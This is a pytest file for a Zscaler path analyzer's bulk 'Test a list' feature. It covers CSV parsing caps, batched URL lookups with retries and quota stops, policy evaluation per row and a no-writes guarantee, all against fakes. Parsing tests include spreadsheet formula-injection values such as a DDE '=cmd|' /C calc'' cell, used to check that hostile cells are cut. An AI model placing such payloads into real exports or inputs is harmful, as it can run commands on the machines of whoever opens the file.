"""Test a list (bulk_test.py, the Path analyzer's "Test a list" view): an
untrusted CSV of destinations is parsed with caps, looked up with ZIA's
URL lookup a hundred per request (rate limits, retries and the quota
stop), traced through the Path analyzer's own evaluation against one
tenant read, summed up with recommendations, exported formula-safe, and
handed to Bulk changes without any write. Fakes only: no tenant, no
network, no real sleep."""
from __future__ import annotations

import copy
import csv
import io
import json
import os
import time
import zipfile

import pytest
from conftest import read_store_text

import bulk_test as bt
import path_analyzer as pa
from test_data_flow import ROUTES as DF_ROUTES
from test_path_analyzer import SCOPE_ALL
from test_ssl_flow import CATALOGUE, FakeCl
from zia_module_fixtures import MODULE_ROUTES

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FULL = pa.full_path_scope()
CREDS = dict({"vanity_domain": "acme", "client_id": "abc123456789", "client_secret": "secret-secret-secret"}, **SCOPE_ALL)

ROUTES = copy.deepcopy(DF_ROUTES)
ROUTES["/zia/urlFilteringRules"] = ROUTES["/zia/urlFilteringRules"] + [
    {"id": 22, "name": "Caution streaming", "order": 3, "state": "ENABLED", "action": "CAUTION", "urlCategories": ["STREAMING_MEDIA"]},
    {"id": 23, "name": "Isolate news", "order": 4, "state": "ENABLED", "action": "ISOLATE", "urlCategories": ["NEWS_AND_MEDIA"]},
    {"id": 24, "name": "Block social for finance", "order": 5, "state": "ENABLED", "action": "BLOCK", "urlCategories": ["SOCIAL_NETWORKING"],
     "groups": [{"id": 7, "name": "Finance"}]},
]
LOOKUP = {
    "casino.example": {"urlClassifications": ["GAMBLING"]},
    "tv.example": {"urlClassifications": ["STREAMING_MEDIA"]},
    "news.example": {"urlClassifications": ["NEWS_AND_MEDIA"]},
    "social.example": {"urlClassifications": ["SOCIAL_NETWORKING"]},
    "evil.example": {"urlClassifications": ["MALWARE_SITE"], "urlClassificationsWithSecurityAlert": ["MALWARE_SITE"]},
    "new.example": {"urlClassifications": ["NEWLY_REG_DOMAINS"]},
    "mail.example.com": {"urlClassifications": ["WEB_MAIL"]},
}


class Tenant(FakeCl):
    """The Data Flow fake plus ZIA's URL lookup. `script` is a list of
    answers for the next lookups: a status (int), an exception, or None
    for a normal answer."""

    def __init__(self, script=None):
        super().__init__(ROUTES, CATALOGUE)
        self.script = list(script or [])
        self.lookups = []
        self.reads = 0
        self.writes = []

    def get(self, ep, p=None):
        self.reads += 1
        return super().get(ep, p)

    def post(self, ep, body=None):
        if ep != "/zia/urlLookup":
            self.writes.append(ep)
            raise AssertionError("only the read-only URL lookup may be posted")
        self.lookups.append(list(body))
        if "bad.example" in body:
            return {"error": "INVALID_INPUT_ARGUMENT"}, 400
        step = self.script.pop(0) if self.script else None
        if isinstance(step, Exception):
            raise step
        if isinstance(step, tuple):
            return step
        if isinstance(step, int):
            return {"error": f"HTTP {step}"}, step
        return [dict(LOOKUP.get(u, {"urlClassifications": []}), url=u) for u in body], 200

    def put(self, *a, **k):
        self.writes.append(a)
        raise AssertionError("no write")

    delete = put


class Sleeps:
    def __init__(self):
        self.total = 0.0

    def __call__(self, s):
        self.total += s


def _run(text, client=None, **kw):
    kw.setdefault("sleep", Sleeps())
    return bt.run(client or Tenant(), bt.parse(text), scope=FULL, **kw)


def _rows(rn):
    return {r["target"]: r for r in rn.rows()}


# ── Parsing an untrusted list ───────────────────────────────────────────

def test_a_header_with_aliases_maps_every_optional_column():
    """ASVS V5.1.3 · CWE-20: a header line with aliases is read into the known columns; unknown columns are ignored."""
    # Arrange
    text = "﻿Dest IP;Dest Port;Proto;Src IP;Site;Country;URL Category;Username;Note;Expected Action;Extra\n" \
           "203.0.113.5;443;tcp;10.1.1.1;HQ;DE;gambling;alice;crm;deny;x\n"
    # Act
    p = bt.parse(text)
    e = p.entries[0]
    # Assert
    assert p.targets == ["203.0.113.5"] and p.is_ip[0] == 1
    assert (e["port"], e["protocol"], e["source_ip"], e["location"], e["dest_country"], e["category"], e["user"], e["label"], e["expected"]) == \
        (443, "TCP", "10.1.1.1", "HQ", "DE", ("GAMBLING",), "alice", "crm", "BLOCK")


def test_without_a_header_the_columns_are_destination_port_protocol():
    """ASVS V5.1.3 · CWE-20: a headerless list reads destination, then a port and a protocol when present."""
    # Arrange / Act
    p = bt.parse("dropbox.com,443,udp\nhttps://Example.org/path?q=1\n")
    # Assert
    assert p.targets == ["dropbox.com", "example.org"]
    assert p.entries[0]["port"] == 443 and p.entries[0]["protocol"] == "UDP"
    assert "URL path is not evaluated" in p.row_notes[1]


@pytest.mark.parametrize("text,count,first,last", [
    ("10.0.0.0/30", 4, "10.0.0.0", "10.0.0.3"),
    ("10.0.0.5-10.0.0.7", 3, "10.0.0.5", "10.0.0.7"),
    ("10.0.0.5-6", 2, "10.0.0.5", "10.0.0.6"),
    ("2001:db8::/126", 4, "2001:db8::", "2001:db8::3"),
    ("10.1.0.0/16", 65536, "10.1.0.0", "10.1.255.255"),
])
def test_cidr_blocks_and_ranges_expand_to_one_row_per_address(text, count, first, last):
    """ASVS V5.1.4 · CWE-20: CIDR blocks and ranges expand to every address, a /16 at most (boundary included)."""
    # Act
    p = bt.parse(text)
    # Assert
    assert len(p) == count and p.targets[0] == first and p.targets[-1] == last and set(p.entry_of) == {0}


@pytest.mark.parametrize("text,why", [
    ("10.0.0.0/15", "at most 65,536"),
    ("10.0.0.9-10.0.0.1", "ends before it starts"),
    ("10.0.0.1-300", "over 255"),
    ("10.0.0.300/24", "not a valid CIDR"),
    ("=HYPERLINK(\"http://x\")", "not a URL"),
    ("not a host", "not a URL"),
])
def test_a_bad_line_is_skipped_with_its_reason_never_fatal(text, why):
    """ASVS V5.1.3 · CWE-20 · CWE-1236: a malformed row is skipped with the reason while the rest of the list is still tested."""
    # Act
    p = bt.parse(text + "\nexample.com\n")
    # Assert
    assert p.targets == ["example.com"] and p.skipped_count == 1 and why in p.skipped[0]["why"], p.skipped


def test_the_list_size_and_row_caps_refuse_in_words(monkeypatch):
    """ASVS V12.1.1 · CWE-400 · CWE-770: a list over the size, line or expanded-row cap is refused as a whole with a plain reason."""
    # Arrange
    monkeypatch.setattr(bt, "MAX_ROWS", 10)
    monkeypatch.setattr(bt, "MAX_LINES", 3)
    # Act / Assert
    with pytest.raises(bt.ListError, match="more than 10 rows"):
        bt.parse("10.0.0.0/29\n10.0.1.0/29\n")
    with pytest.raises(bt.ListError, match="more than 3 lines"):
        bt.parse("a.example\nb.example\nc.example\nd.example\n")
    with pytest.raises(bt.ListError, match="larger than 8 MB"):
        bt.parse("x" * (bt.MAX_TEXT_BYTES + 1))
    with pytest.raises(bt.ListError, match="names no destination"):
        bt.parse("# only a comment\nnot a host\n")


def test_a_long_line_and_hostile_cells_are_cut_not_trusted():
    """ASVS V5.1.4 · CWE-1236 · CWE-20: an over-long line is skipped and control characters and long cells are cut, never evaluated."""
    # Arrange
    text = "destination,label,port,expected\n" + "a" * (bt.MAX_LINE_CHARS + 1) + "\nexample.com,\x07=cmd|' /C calc'!A0" + "x" * 500 + ",99999,maybe\n"
    # Act
    p = bt.parse(text)
    e = p.entries[0]
    # Assert
    assert p.skipped_count == 1 and "longer than" in p.skipped[0]["why"]
    assert e["label"].startswith("=cmd") and len(e["label"]) <= 128 and "\x07" not in e["label"]
    assert "port" not in e and "expected" not in e and len(e["notes"]) == 2


# ── ZIA's URL lookup ────────────────────────────────────────────────────

def test_the_lookup_asks_a_hundred_per_request_and_shares_identical_answers():
    """ASVS V11.1.4 · CWE-770: unique destinations are looked up a hundred per request and identical answers share one object."""
    # Arrange
    c = Tenant()
    keys = [f"h{i}.example.com" for i in range(250)] + ["h0.example.com"]
    # Act
    out, st = bt.lookup_all(c, keys, sleep=Sleeps())
    # Assert
    assert [len(b) for b in c.lookups] == [100, 100, 50] and st["requests"] == 3 and st["looked_up"] == 250
    assert out["h1.example.com"] is out["h2.example.com"]


@pytest.mark.parametrize("step,waited", [(412, 5), (503, 5), (0, 5), (429, 30)])
def test_a_transient_or_rate_refusal_is_waited_out_and_retried(step, waited):
    """ASVS V11.1.4 · CWE-400: a 412, 5xx, lost connection or a 429 is waited out on the schedule and the lookup retried."""
    # Arrange
    c, sl = Tenant([step]), Sleeps()
    # Act
    out, st = bt.lookup_all(c, ["casino.example"], sleep=sl)
    # Assert
    assert out["casino.example"]["categories"] == ["GAMBLING"] and st["retries"] == 1 and sl.total == waited


def test_a_retry_after_from_the_api_is_honoured():
    """ASVS V11.1.4 · CWE-400: the Retry-After an SDK error carries sets the wait before the retry."""
    # Arrange
    err = RuntimeError("rate limited")
    err.status, err.retry_after = 429, 7
    c, sl = Tenant([err]), Sleeps()
    # Act
    out, st = bt.lookup_all(c, ["casino.example"], sleep=sl)
    # Assert
    assert sl.total == 7 and out["casino.example"]["error"] is None


def test_the_hourly_quota_stops_the_lookups_with_rerun_later():
    """ASVS V11.1.4 · CWE-770: ZIA's hourly quota ends the lookups at once and every destination left is labelled "rerun later"."""
    # Arrange
    c = Tenant([None, ({"error": "rate limited: ZIA's hourly limit is reached", "status": 429}, 429)])
    keys = [f"h{i}.example.com" for i in range(150)]
    # Act
    out, st = bt.lookup_all(c, keys, sleep=Sleeps())
    # Assert
    assert st["stopped_kind"] == "quota" and st["not_looked_up"] == 50 and len(c.lookups) == 2
    assert out["h149.example.com"]["error"] == bt.QUOTA_LABEL and "rerun later" in bt.QUOTA_LABEL
    assert out["h0.example.com"]["error"] is None


def test_refusals_after_lookups_worked_are_a_quota_but_before_any_worked_they_are_a_permission():
    """ASVS V11.1.4 · ASVS V4.1.3 · CWE-285: a 403 before any lookup worked stops as not permitted; after some worked it is retried, then a quota stop."""
    # Arrange / Act
    out1, st1 = bt.lookup_all(Tenant([403]), ["a.example"], sleep=Sleeps())
    sl = Sleeps()
    out2, st2 = bt.lookup_all(Tenant([None, 403, 403, 403, 403]), [f"h{i}.example.com" for i in range(101)], sleep=sl)
    # Assert
    assert st1["stopped_kind"] == "denied" and out1["a.example"]["error"] == bt.DENIED_LABEL
    assert st2["stopped_kind"] == "quota" and st2["retries"] == 3 and sl.total == sum(bt.REFUSED_WAITS)


def test_a_bad_entry_is_isolated_by_splitting_the_request():
    """ASVS V5.1.3 · CWE-20: a 400 for a whole request is split until the refused entry is alone; the others are still looked up."""
    # Arrange
    c = Tenant()
    keys = ["casino.example", "tv.example", "news.example", "bad.example"]
    # Act
    out, st = bt.lookup_all(c, keys, sleep=Sleeps())
    # Assert
    assert out["casino.example"]["categories"] == ["GAMBLING"] and out["news.example"]["categories"] == ["NEWS_AND_MEDIA"]
    assert "HTTP 400" in out["bad.example"]["error"] and st["looked_up"] == 3 and [len(b) for b in c.lookups] == [4, 2, 2, 1, 1]


def test_the_run_lookup_limit_labels_the_rest_rerun_later():
    """ASVS V11.1.4 · CWE-770: boundary: at the run's request limit the lookups end and the rest are labelled "rerun later"."""
    # Act
    out, st = bt.lookup_all(Tenant(), [f"h{i}.example.com" for i in range(201)], max_requests=2, sleep=Sleeps())
    # Assert
    assert st["requests"] == 2 and st["stopped_kind"] == "cap" and out["h200.example.com"]["error"] == bt.CAP_LABEL


def test_stop_during_a_wait_ends_the_lookups_and_sends_nothing_more():
    """ASVS V11.1.5 · CWE-400: Stop pressed while a retry waits ends the lookups; no further request is sent."""
    # Arrange
    import threading
    cancel = threading.Event()
    c = Tenant([503, None])

    def sleep(s):
        cancel.set()
    # Act / Assert
    with pytest.raises(bt.Stopped):
        bt.lookup_all(c, ["casino.example"], cancel=cancel, sleep=sleep)
    assert len(c.lookups) == 1


# ── Evaluation ──────────────────────────────────────────────────────────

def test_every_result_kind_comes_from_the_path_analyzers_own_trace():
    """ASVS V1.4.4 · CWE-284: blocked, bypassed, caution, isolated, allowed and allowed but blockable come from path_analyzer's verdict."""
    # Arrange
    text = "casino.example\nupdates.vendor.com\ntv.example\nnews.example\nsocial.example\nmail.example.com\n"
    # Act
    rn = _run(text)
    rows = _rows(rn)
    # Assert
    assert (rows["casino.example"]["result"], rows["casino.example"]["rule"], rows["casino.example"]["area"]) == ("blocked", "Block gambling", "URL")
    assert (rows["updates.vendor.com"]["result"], rows["updates.vendor.com"]["area"]) == ("bypassed", "Client Connector")
    assert (rows["tv.example"]["result"], rows["tv.example"]["rule"]) == ("caution", "Caution streaming")
    assert (rows["news.example"]["result"], rows["news.example"]["rule"]) == ("isolated", "Isolate news")
    assert rows["social.example"]["result"] == "allowed" and rows["social.example"]["blockable_by"] == "Block social for finance"
    assert rows["mail.example.com"]["result"] == "allowed" and rows["mail.example.com"]["inspection"] == "blind"
    c = rn.summary["counts"]
    assert (c["blocked"], c["bypassed"], c["caution"], c["isolated"], c["allowed"], c["allowed_but_blockable"]) == (1, 1, 1, 1, 2, 1)


def test_a_shared_trace_gives_the_same_answer_as_tracing_each_destination():
    """ASVS V1.4.4 · CWE-682: destinations that share a trace get exactly what the Path analyzer says for each one alone."""
    # Arrange
    hosts = ["a.example", "b.example", "casino.example", "x.casino.example", "updates.vendor.com", "y.internal.corp", "portal.partner.com",
             "203.0.113.7", "203.0.113.8", "cdn.box.com"]
    c = Tenant()
    # Act
    rn = _run("\n".join(hosts), client=c)
    rows = _rows(rn)
    snap = pa.analyze(Tenant(), "seed.example", scope=FULL)["snapshot_for_cache"]
    # Assert
    for h in hosts:
        lk = rn.lookups[h]
        alone = bt.summarize_analysis(pa.analyze(Tenant(), h, scope=FULL, snapshot=snap, lookup=lk))
        assert (rows[h]["result"], rows[h]["rule"], rows[h]["area"], rows[h]["inspection"]) == \
            (alone["result"], alone["rule"], alone["area"], alone["inspection"]), h
    assert rn.summary["traced"] < len(hosts)


def test_a_category_in_the_file_overrides_the_lookup_and_is_not_looked_up():
    """ASVS V5.1.3 · CWE-20: a row's category column decides its category; that destination is not sent to ZIA's lookup."""
    # Arrange
    c = Tenant()
    # Act
    rn = _run("destination,category\nplain.example,GAMBLING\nother.example,\n", client=c)
    rows = _rows(rn)
    # Assert
    assert rows["plain.example"]["result"] == "blocked" and rows["plain.example"]["category_source"] == "your file"
    assert [u for b in c.lookups for u in b] == ["other.example"]


def test_the_tenant_is_read_once_for_every_row_and_nothing_is_written():
    """ASVS V1.4.4 · CWE-284 · A01:2021: the tenant is read once for the whole list; only the read-only URL lookup is posted."""
    # Arrange
    c = Tenant()
    # Act
    rn = _run("10.9.0.0/24\ncasino.example\n", client=c)
    reads = c.reads
    rn2 = bt.run(c, bt.parse("news.example"), scope=FULL, snapshot=rn.summary["snapshot_for_cache"], sleep=Sleeps())
    # Assert
    assert reads > 0 and c.reads == reads and not c.writes and rn2.summary["counts"]["isolated"] == 1


def test_nothing_in_scope_reads_nothing():
    """ASVS V4.1.3 · CWE-272: a scope with nothing the path reads is refused before any read."""
    # Arrange
    c = Tenant()
    # Act / Assert
    with pytest.raises(ValueError):
        bt.run(c, bt.parse("example.com"), scope={"read": []}, sleep=Sleeps())
    assert c.reads == 0 and not c.lookups


def test_stop_keeps_the_rows_tested_and_marks_the_rest_not_tested(monkeypatch):
    """ASVS V11.1.5 · CWE-400: Stop ends the run between rows; the rows tested are kept, the rest say not tested, and the read is not kept."""
    # Arrange
    import threading
    cancel = threading.Event()
    monkeypatch.setattr(bt, "STOP_EVERY", 1)
    real = bt.PathEvaluator.evaluate
    calls = []

    def evaluate(self, row):
        calls.append(row["host"])
        out = real(self, row)
        if len(calls) == 2:   # Stop pressed as the second row finishes
            cancel.set()
        return out
    monkeypatch.setattr(bt.PathEvaluator, "evaluate", evaluate)
    # Act
    rn = _run("casino.example\nnews.example\ntv.example\n", cancel=cancel)
    rows = list(rn.rows())
    # Assert
    assert rn.summary["stopped"] and rn.summary["snapshot_for_cache"] is None
    assert [r["result"] for r in rows] == ["blocked", "isolated", "not tested"] and rn.summary["counts"]["not_tested"] == 1


def test_another_policy_area_plugs_in_and_the_first_to_decide_wins():
    """ASVS V1.1.2 · CWE-1059: a registered evaluator (a firewall stand-in) gets every row field and decides before the web path when it blocks."""
    # Arrange
    seen = []

    class Firewall:
        key, label, precedence = "firewall", "Cloud Firewall (test)", 10

        def __init__(self, **kw):
            pass

        def evaluate(self, row):
            seen.append((row["host"], row["port"], row["protocol"]))
            if row["port"] == 22:
                return bt._result(result="blocked", area="Firewall", action="BLOCK_DROP", rule="No SSH out", evaluator="firewall")
            return None
    # Act
    rn = _run("destination,port,protocol\n203.0.113.9,22,tcp\n203.0.113.10,443,tcp\n", evaluators=[bt.PathEvaluator, Firewall])
    rows = _rows(rn)
    # Assert
    assert ("203.0.113.9", 22, "TCP") in seen
    assert (rows["203.0.113.9"]["result"], rows["203.0.113.9"]["area"], rows["203.0.113.9"]["rule"]) == ("blocked", "Firewall", "No SSH out")
    assert rows["203.0.113.10"]["result"] == "allowed"


# ── Recommendations ─────────────────────────────────────────────────────

@pytest.mark.parametrize("dest,expected,meets,area", [
    ("casino.example", "block", "yes", ""),
    ("casino.example", "allow", "no", "URL"),
    ("updates.vendor.com", "block", "no", "Client Connector"),
    ("tv.example", "block", "no", "URL"),
    ("evil.example", "block", "no", "ATP"),
    ("social.example", "block", "no", "URL"),
    ("new.example", "block", "no", "URL"),
    ("203.0.113.44", "block", "no", "Firewall"),
    ("mail.example.com", "block", "no", "URL"),
    ("mail.example.com", "allow", "yes", ""),
])
def test_each_row_is_compared_with_what_was_expected_and_given_an_area(dest, expected, meets, area):
    """ASVS V1.1.2 · CWE-1059: expected versus actual per row, with the area to fix a miss in."""
    # Act
    r = _rows(_run(f"destination,expected\n{dest},{expected}\n"))[dest]
    # Assert
    assert (r["meets"], r["recommended_area"]) == (meets, area), r["recommendation"]
    assert r["recommendation"]


# ── Every module, per row (the single-destination analyzer's answer) ────

PAC_SOURCE = ('function FindProxyForURL(url, host) { if (isInNet(host, "172.16.0.0", "255.240.0.0")) return "DIRECT"; '
              'if (shExpMatch(url, "*://*.direct.example/*")) return "DIRECT"; return "PROXY gateway.zscaler.net:80"; }')


def _module_routes():
    """The Data Flow fake plus every ZIA module (zia_module_fixtures), a
    Cloud Firewall rule for a source range and one that allows NTP, and a
    PAC file whose DIRECT clauses are not literal host patterns."""
    routes = dict(ROUTES, **copy.deepcopy(MODULE_ROUTES))
    routes["/zia/firewallFilteringRules"] = [
        {"id": 10, "name": "Block lab sources", "order": 0, "state": "ENABLED", "action": "BLOCK_DROP", "srcIps": ["10.66.0.0/16"]},
        {"id": 9, "name": "Allow NTP", "order": 1, "state": "ENABLED", "action": "ALLOW", "nwServices": [{"id": 15, "name": "NTP"}]},
    ] + routes["/zia/firewallFilteringRules"]
    routes["/zia/networkServices"] = routes["/zia/networkServices"] + [{"id": 15, "name": "NTP", "tag": "NTP", "destUdpPorts": [{"start": 123}]}]
    routes["/zia/pacFiles"] = [{"id": 1, "name": "corp.pac", "pacUrl": "https://pac.example/corp.pac", "pacContent": PAC_SOURCE}]
    return routes


class ModTenant(Tenant):
    """Tenant with every ZIA module; records every GET path."""

    def __init__(self, script=None):
        super().__init__(script)
        self.routes = _module_routes()
        self.paths = []

    def get(self, ep, p=None):
        self.paths.append(ep)
        return super().get(ep, p)


def _zpa():
    import zpa_reader
    from test_path_zpa_workloads import zpa_snap
    old, zpa_reader.PACE_SECONDS = zpa_reader.PACE_SECONDS, 0.0
    try:
        snap, profiles = zpa_snap()
    finally:
        zpa_reader.PACE_SECONDS = old
    return {"snapshot": snap, "profiles": profiles}


def _mrun(text, client=None, **kw):
    kw.setdefault("sleep", Sleeps())
    return bt.run(client or ModTenant(), bt.parse(text), scope=kw.pop("scope", FULL), **kw)


def _one(text, **kw):
    rows = list(_mrun(text, **kw).rows())
    assert len(rows) == 1, rows
    return rows[0]


def test_a_firewall_decided_row_names_the_rule_and_an_ip_group_list():
    """ASVS V1.1.2 · CWE-670: traffic that is not web is decided by the Cloud Firewall for the row's port and protocol; a miss goes to an IP destination group."""
    # Act
    rn = _mrun("destination,port,protocol,expected\nssh.example,22,tcp,block\ntime.example,123,udp,block\n198.51.100.7,22,tcp,allow\n")
    rows = _rows(rn)
    # Assert
    ssh, ntp, bad = rows["ssh.example"], rows["time.example"], rows["198.51.100.7"]
    assert (ssh["result"], ssh["area"], ssh["rule"], ssh["meets"]) == ("blocked", "Firewall", "Default Firewall Filtering Rule", "yes")
    assert (ntp["result"], ntp["area"], ntp["rule"], ntp["recommended_area"]) == ("allowed", "Firewall", "Allow NTP", "Firewall")
    assert (bad["result"], bad["area"], bad["rule"], bad["recommended_area"]) == ("blocked", "Firewall", "Block SSH to bad nets", "Firewall")
    assert "IP destination group" in bad["recommendation"] and "not inspected" in ntp["inspection"]
    assert bt.area_list(rn, "firewall", "block") == ["time.example"] and bt.area_list(rn, "firewall", "allow") == ["198.51.100.7"]
    assert "IP destination group" in next(x["where"] for x in rn.summary["lists"] if x["area"] == "Firewall")


def test_a_dns_decided_row_stops_before_url_filtering():
    """ASVS V1.1.2 · CWE-670: DNS Control blocks the lookup before URL filtering decides; the area to fix an unwanted block is DNS Control."""
    # Act
    r = _one("destination,expected\ncasino.example,allow\n")
    # Assert
    assert (r["result"], r["area"], r["rule"], r["stops_at"]) == ("blocked", "DNS", "Block gambling lookups", "DNS Control")
    assert (r["meets"], r["recommended_area"]) == ("no", "DNS") and "DNS Control rule 'Block gambling lookups'" in r["recommendation"]


def test_an_atp_decided_row_is_an_atp_area():
    """ASVS V1.1.2 · CWE-670: a destination on the ATP denylist is blocked by Advanced Threat Protection, not by URL filtering."""
    # Act
    r = _one("destination,expected\nbad.example,allow\n")
    # Assert
    assert (r["result"], r["area"], r["rule"]) == ("blocked", "ATP", "Malicious URLs (ATP denylist)")
    assert r["recommended_area"] == "ATP" and "security exceptions" in r["recommendation"]


def test_a_zpa_carried_row_is_answered_by_zpa_and_never_traced_in_zia():
    """ASVS V1.4.4 · CWE-284 · CWE-670: ZPA first: a row an application segment carries gets ZPA's answer and its segment note; ZIA is not traced for it."""
    # Arrange
    c = ModTenant()
    # Act
    rn = _mrun("destination,port,protocol,expected\ngit.corp.example,443,tcp,block\ncasino.example,,,block\n", client=c, zpa=_zpa())
    rows = _rows(rn)
    git = rows["git.corp.example"]
    # Assert
    assert (git["result"], git["area"], git["rule"], git["segment"], git["inspection"]) == \
        ("allowed", "ZPA", "Allow corp", "Git", "carried by ZPA (ZIA does not apply)")
    assert (git["meets"], git["recommended_area"]) == ("no", "ZPA") and "segment 'Git'" in git["recommendation"]
    assert rows["casino.example"]["area"] == "DNS"
    assert [u for b in c.lookups for u in b] == ["git.corp.example", "casino.example"], "the lookup is asked before ZPA decides"
    zpa_list = next(x for x in rn.summary["lists"] if x["area"] == "ZPA")
    assert zpa_list["note"].endswith("Git.") and bt.area_list(rn, "zpa", "block") == ["git.corp.example"]
    assert next(a for a in rn.summary["expectations"]["by_area"] if a["area"] == "ZPA")["segments"] == ["Git"]
    assert rn.summary["zpa"]["state"] == "kept" and rn.summary["traced"] == 1


def test_a_zpa_denied_row_is_blocked_by_zpa():
    """ASVS V1.4.4 · CWE-284: ZPA's default deny decides a carried row it has no access rule for; ZIA does not apply."""
    # Arrange
    import zpa_reader
    from test_path_zpa_workloads import zpa_snap
    old, zpa_reader.PACE_SECONDS = zpa_reader.PACE_SECONDS, 0.0
    try:
        snap, profiles = zpa_snap(access=[])
    finally:
        zpa_reader.PACE_SECONDS = old
    # Act
    r = _one("destination,expected\ngit.corp.example,allow\n", zpa={"snapshot": snap, "profiles": profiles})
    # Assert
    assert (r["result"], r["area"], r["rule"], r["recommended_area"]) == ("blocked", "ZPA", "ZPA default deny", "ZPA")


def test_zpa_is_read_once_for_every_row_and_only_when_ticked():
    """ASVS V4.1.3 · CWE-272: ZPA is read once per run when it is in scope, and not at all when it is not."""
    # Arrange
    import zpa_reader
    from test_path_zpa_workloads import zpa_data
    from test_zpa_analysis import FakeTenant
    old, zpa_reader.PACE_SECONDS = zpa_reader.PACE_SECONDS, 0.0
    calls = []
    sdk = FakeTenant(zpa_data())
    real = zpa_reader.read

    def counted(*a, **k):
        calls.append(1)
        return real(*a, **k)
    try:
        zpa_reader.read = counted
        rn = _mrun("10.1.0.0/30\ngit.corp.example\nsvc.corp.example,22,tcp\n", zpa={"client": sdk})
    finally:
        zpa_reader.read, zpa_reader.PACE_SECONDS = real, old
    off = _mrun("git.corp.example\n")
    # Assert
    assert len(calls) == 1 and rn.summary["zpa"]["state"] == "read" and rn.summary["zpa_for_cache"]["snapshot"]
    assert {r["area"] for r in rn.rows()} == {"ZPA"}
    assert off.summary["zpa"]["state"] == "not_in_scope" and _rows(off)["git.corp.example"]["area"] != "ZPA"
    assert any("ZPA is not in scope" in a for a in off.summary["assumptions"])


def test_zpa_that_cannot_be_read_is_said_once_and_zia_still_answers():
    """ASVS V1.4.4 · CWE-754: ZPA ticked but not readable is stated once in the assumptions; every row still gets ZIA's answer, never a guess about ZPA."""
    # Act
    rn = _mrun("git.corp.example\ncasino.example\n", zpa={"problem": "ZPA was not read: the ZPA customer ID is missing."})
    rows = _rows(rn)
    # Assert
    assert rn.summary["zpa"] == {"state": "not_read", "note": "ZPA was not read: the ZPA customer ID is missing."}
    assert "ZPA was not read: the ZPA customer ID is missing." in rn.summary["assumptions"]
    assert rows["git.corp.example"]["area"] != "ZPA" and "ZPA" not in rows["git.corp.example"]["notes"]
    assert rows["casino.example"]["area"] == "DNS"


def test_a_pac_direct_row_is_found_by_evaluating_the_pac_file():
    """ASVS V1.1.2 · CWE-693: the PAC file is evaluated per row (pac_eval, never run): DIRECT by address range or by URL pattern bypasses Zscaler."""
    # Act
    rn = _mrun("destination,expected\n172.20.1.5,block\nx.direct.example,block\n203.0.113.9,block\ny.example,block\n", platform="macos")
    rows = _rows(rn)
    # Assert
    for h in ("172.20.1.5", "x.direct.example"):
        assert (rows[h]["result"], rows[h]["area"], rows[h]["rule"], rows[h]["stops_at"]) == ("bypassed", "Client Connector", "corp.pac", "PAC file"), h
        assert rows[h]["recommended_area"] == "Client Connector"
    assert rows["203.0.113.9"]["result"] == "allowed" and rows["y.example"]["result"] == "allowed"


def test_an_identity_scoped_row_is_evaluated_for_that_identity():
    """ASVS V1.1.2 · CWE-863: a row's group decides a group-scoped rule: it applies to Finance, is skipped for Sales, and stays blockable for anyone."""
    # Act
    rn = _mrun("destination,group,user,department,location\nsocial.example,Finance,,,\nsocial.example,Sales,,,\nsocial.example,,,,\n"
               "social.example,Finance; Sales,alice@example.com,Risk,HQ\n")
    rows = list(rn.rows())
    # Assert
    assert (rows[0]["result"], rows[0]["rule"]) == ("blocked", "Block social for finance")
    assert rows[1]["result"] == "allowed" and "Block social for finance" not in rows[1]["blockable_by"]
    assert rows[2]["result"] == "allowed" and "Block social for finance" in rows[2]["blockable_by"]
    assert rows[3]["result"] == "blocked" and (rows[3]["user"], rows[3]["department"]) == ("alice@example.com", "Risk")


def test_a_source_ip_is_matched_against_the_firewall_source_conditions():
    """ASVS V1.1.2 · CWE-670: a row's source IP decides a source-scoped firewall rule; without one the rule only makes the row blockable."""
    # Act
    rows = list(_mrun("destination,port,source ip\n203.0.113.9,443,10.66.1.1\n203.0.113.9,443,10.1.1.1\n203.0.113.9,443,\n").rows())
    # Assert
    assert (rows[0]["result"], rows[0]["area"], rows[0]["rule"]) == ("blocked", "Firewall", "Block lab sources")
    assert rows[1]["result"] == "allowed" and not rows[1]["blockable_by"]
    assert rows[2]["result"] == "allowed" and rows[2]["blockable_by"] == "Block lab sources"


def test_an_out_of_scope_module_says_not_in_scope_and_is_not_read():
    """ASVS V4.1.3 · CWE-272: with ZIA platform not ticked the Cloud Firewall is not read, and a row it would decide says not in scope."""
    # Arrange
    scope = pa.path_scope(["dlp", "zcc"], {"web_dlp": "zscaler", "ssl_inspection": "zscaler", "cloud_app_control": "zscaler"})
    c = ModTenant()
    # Act
    rn = _mrun("destination,port,protocol\nssh.example,22,tcp\nplain.example,443,tcp\n", client=c, scope=scope)
    rows = _rows(rn)
    # Assert
    assert (rows["ssh.example"]["result"], rows["ssh.example"]["inspection"]) == ("unverified", "not in scope")
    assert "Cloud Firewall: not in scope on the Scope page" in rows["ssh.example"]["notes"]
    assert rows["plain.example"]["result"] == "allowed"
    assert not [p for p in c.paths if p in zpm_endpoints()]
    assert any("not in scope" in a and "Cloud Firewall" in a for a in rn.summary["assumptions"])


def zpm_endpoints():
    import zia_path_modules
    return set(zia_path_modules.ENDPOINTS)


def test_icmp_and_any_protocol_rows_say_how_they_were_traced():
    """ASVS V5.1.3 · CWE-20: an ICMP row is not traced and says so; protocol 'any' is traced as TCP and says so."""
    # Act
    rows = list(_mrun("destination,protocol\nx.example,icmp\ny.example,any\n").rows())
    # Assert
    assert rows[0]["result"] == "unverified" and "ICMP is not traced" in rows[0]["notes"]
    assert rows[1]["result"] == "allowed" and "traced as TCP" in rows[1]["notes"]


def test_a_url_gives_its_port_from_its_scheme_or_its_own_port():
    """ASVS V5.1.3 · CWE-20: http:// is port 80 and https://x:8443/ is 8443, as the single-destination analyzer reads them; a port column wins."""
    # Act
    p = bt.parse("destination,port\nhttp://a.example/x,\nhttps://b.example:8443/,\nhttp://c.example/,22\nhttps://d.example/,\n")
    # Assert
    assert [e.get("port") for e in p.entries] == [80, 8443, 22, None]


ROW_CASES = [("chat.openai.com", "udp", 443, None, None), ("ssh.example", "tcp", 22, None, None), ("203.0.113.10", "tcp", 3389, None, None),
             ("casino.example", None, None, None, None), ("bad.example", None, None, None, None), ("social.example", None, None, {"groups": ["Finance"]}, None),
             ("203.0.113.9", "tcp", 443, None, "10.66.1.1"), ("time.example", "udp", 123, None, None), ("x.direct.example", None, None, None, None)]


@pytest.mark.parametrize("platform", ["windows", "macos"])
def test_every_row_gets_the_single_destination_analyzers_answer(platform):
    """ASVS V1.4.4 · CWE-682: each row (port, protocol, identity, source IP), shared or not, equals what path_analyzer.analyze says for it alone."""
    # Arrange
